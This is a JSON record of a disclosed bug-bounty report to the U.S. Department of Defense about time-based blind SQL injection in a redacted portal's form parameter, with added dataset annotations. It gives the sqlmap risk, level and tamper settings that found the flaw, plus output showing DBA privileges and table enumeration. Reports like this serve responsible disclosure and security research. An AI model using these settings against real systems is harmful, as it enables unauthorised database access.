{
  "reported_to": "U.S. Dept Of Defense",
  "reported_by": "arkaic ",
  "title": "Followup - SQL Injection - https://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/MSI.portal",
  "content": "\nSummary:\nTime based blind sql injection for parameter MSI_additionalFilterType1, at the following URL:\nhttps://\u2588\u2588\u2588/\u2588\u2588\u2588/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61\nDescription:\nThis is a follow up to a previous report I submitted:\nhttps://hackerone.com/reports/674838\nThe following page has a form parameter which is vulnerable to time based blind sql injection, which allows an attacker to retrieve information from the database.\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61\nThe page uses several hidden parameters which are sent when the form is submitted. The specific vulnerable parameter in this case is \"MSI_additionalFilterType1\".\nSample form POST data, prior to SQL injection testing:\nhttps://\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588/msi/query_results.jsp?MSI_additionalFilterType1=-999&MSI_additionalFilterType2=-999&MSI_additionalFilterValue1=-999&MSI_additionalFilterValue2=-999&MSI_generalFilterType=-999&MSI_generalFilterValue=-999&MSI_outputOptionType1=-999&MSI_outputOptionType2=-999&MSI_outputOptionValue1=-999&MSI_outputOptionValue2=-999&MSI_queryType=-999\nInitially I was not able to retrieve details about the database user nor the schema. After adjusting several parameters for sqlmap, I was able to successfully do so.\nHere we can see the specific edition of Oracle DB used, along with the user and database name:\n\u2588\u2588\u2588\u2588\nCode 1014 Bytes\n1banner: 'Oracle Database 11g Enterprise Edition Release 11.2.0.3.0 - 64bit Production'\n2[13:11:58] [INFO] fetching current user\n3[13:11:58] [INFO] retrieved: \u2588\u2588\u2588\n4current user: '\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588'\n5[13:13:17] [INFO] testing if current user is DBA\n6current user is DBA: True\n7[13:13:25] [WARNING] schema names are going to be used on Oracle for enumeration as the counterpart to database names on other DBMSes\n8[13:13:25] [INFO] fetching database (schema) names\n9[13:13:25] [INFO] fetching number of databases\n10[13:13:25] [INFO] retrieved: \n11[13:13:29] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'\n12[13:13:29] [ERROR] unable to retrieve the number of databases\n13[13:13:29] [INFO] falling back to current database\n14[13:13:29] [INFO] fetching current database\n15[13:13:29] [INFO] retrieved: \u2588\u2588\u2588\n16[13:14:48] [WARNING] on Oracle you'll need to use schema names for enumeration as the counterpart to database names on other DBMSes\n17available databases [1]:\n18[*] \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nHere you can see the retrieval of a few table names from the database:\n\u2588\u2588\u2588\u2588\u2588\nCode 546 Bytes\n1[13:18:06] [INFO] fetching tables for database: '\u2588\u2588\u2588\u2588\u2588'\n2[13:18:06] [INFO] fetching number of tables for database '\u2588\u2588\u2588\u2588'\n3multi-threading is considered unsafe in time-based data retrieval. Are you sure of your choice (breaking warranty) [y/N] \n4[13:18:08] [INFO] retrieved: \n5[13:18:14] [INFO] adjusting time delay to 3 seconds due to good response times\n667\n7[13:18:32] [INFO] retrieved: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n8[13:19:54] [INFO] retrieved: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\n9[13:23:29] [INFO] retrieved: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n10[13:25:45] [INFO] retrieved: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\n11[13:28:37] [INFO] retrieved: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\nI interrupted the process at this point, so as to not enumerate all 67 table names, and ceased further testing.\nImpact\nHigh\nStep-by-step Reproduction Instructions\nVisit the vulnerable url (https://\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61) while using an intercepting proxy\nIntercept GET request to capture full URL and all form parameters\nUtilize sqlmap to detect and exploit sql injection in \"MSI_additionalFilterType1\" parameter\nNote: The default configuration of sqlmap will not be able to find the sql injection. I adjusted the following parameters in order to do so. \"--risk 2 --level 3\" and \"--tamper=space2comment,randomcase,between\"\nProduct, Version, and Configuration (If applicable)\nSuggested Mitigation/Remediation Actions\nSanitize all form parameter inputs, and use whitelisting to allow only needed data\nRate limit submissions of forms. Time based sql injection requires many more HTTP requests than would be seen from legitimate browser activity.\nImpact\nHigh/Critical impact.\nThis sql injection attack could be used to retrieve all information from the database. Also, the account is running with DBA privileges which would allow for the retrieval of database account passwords and takeover of the server itself via injection of system commands; these could be leveraged to attack other systems on the network and potential lateral movement to other systems.\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "SQL Injection"
  ],
  "screenshots": {},
  "disclosed_date": 1589490420,
  "report_url": "https://hackerone.com/reports/692326",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Visit the vulnerable URL (https://\u2588\u2588\u2588/\u2588\u2588\u2588\u2588\u2588\u2588/MSI.portal?_nfpb=true&_pageLabel=msi_portal_page_61) while using an intercepting proxy"
    ],
    [
      2,
      "Intercept GET request to capture full URL and all form parameters"
    ],
    [
      3,
      "Utilize sqlmap to detect and exploit sql injection in 'MSI_additionalFilterType1' parameter with adjusted parameters: '--risk 2 --level 3' and '--tamper=space2comment,randomcase,between'"
    ]
  ],
  "vuln_description": "Time-based blind SQL injection vulnerability in the 'MSI_additionalFilterType1' parameter allows an attacker to retrieve information from the database, including sensitive data like database user, schema, and table names. The account has DBA privileges, enabling potential server takeover and lateral movement.",
  "reason": "The vulnerability involves a straightforward SQL injection but requires specific adjustments to sqlmap parameters for detection. The attack does not involve complex application states or novel logic, but the need for parameter tuning adds some complexity.",
  "new_complexity": "MEDIUM",
  "requires_code": false,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "674838",
  "authnz_metadata": {
    "reason": "The SQL injection vulnerability described in the report involves manipulating form parameters to execute arbitrary SQL queries, which is not directly related to authentication or authorization bypass. The proposed methodologies focus on testing authorization boundaries by swapping user sessions and resource IDs, not on detecting SQL injection vulnerabilities through parameter manipulation.",
    "is_detectable": false
  },
  "injection_metadata": {
    "reasoning": "The SQL injection vulnerability described requires non-default sqlmap tampering techniques (space2comment, randomcase, between) and risk/level adjustments to detect, indicating it's not surface-level detectable with simple payloads. While the methodology would identify the parameter through regular navigation, time-based blind SQLi requires specialized delay observation rather than simple same-channel response patterns. The need for payload manipulation beyond basic encoding/context positioning places this outside 'simple payload' detection capabilities as defined by the methodology.",
    "is_simple_injection": false
  }
}